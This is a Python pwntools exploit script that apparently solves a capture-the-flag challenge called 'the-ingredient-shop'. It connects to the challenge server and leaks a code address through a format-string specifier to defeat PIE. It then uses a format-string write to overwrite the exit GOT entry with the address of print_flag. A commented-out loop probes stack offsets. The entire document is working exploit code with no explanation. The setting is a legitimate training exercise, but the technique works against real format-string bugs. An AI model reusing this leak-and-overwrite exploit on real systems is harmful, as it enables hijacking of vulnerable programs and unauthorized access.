#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./shop',checksec=False)
#context.log_level = 'error'
io = remote("the-ingredient-shop-88b6c21206e2a6ed.challs.brunnerne.xyz", "443", ssl=True)

#for i in range(200):
#    io = process()
#    payload = f'%{i}$p'.encode()
#    io.recvuntil(b'exit\n')
#    io.sendline(payload)
#    io.recvuntil(b'choice\n')
#    print(io.recv().split(b'\n')[0],i)
#    io.sendline(b'3')
#    io.recv()

#payload = cyclic(256) + b' %41$p'
payload = b''
payload += b' %43$p '

io.sendlineafter(b'exit\n',payload)
io.recvuntil(b'choice\n')

elf.address = int(io.recvline().strip(),16) - 0x1351

payload = fmtstr_payload(8, writes={
    elf.got.exit : pack(elf.sym.print_flag)
    })

io.sendlineafter(b'exit\n',payload)
io.sendlineafter(b'exit',b'3')
io.interactive()
